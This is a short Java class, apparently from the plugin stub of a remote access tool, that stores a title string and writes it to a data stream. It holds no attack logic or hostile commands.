package pro.jrat.plugin.stub;

import java.io.DataOutputStream;

public class Title implements Activity {
	
	private final String title;
	
	public Title(String title) {
		this.title = title;
	}

	@Override
	public void write(DataOutputStream dos) throws Exception {		
		dos.writeUTF(title);
	}
	
	@Override
	public String toString() {
		return title;
	}

}
